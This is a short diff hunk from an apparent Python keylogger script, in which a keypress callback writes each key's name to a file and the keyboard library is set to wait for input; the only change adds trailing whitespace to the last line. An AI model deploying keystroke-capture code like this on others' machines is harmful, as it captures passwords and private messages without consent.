@@ -20,4 +20,4 @@ def keyPressed(key):
         else:
             file.write(key.name)
 keyboard.on_press(keyPressed)
-keyboard.wait()
+keyboard.wait()                                                                                                 
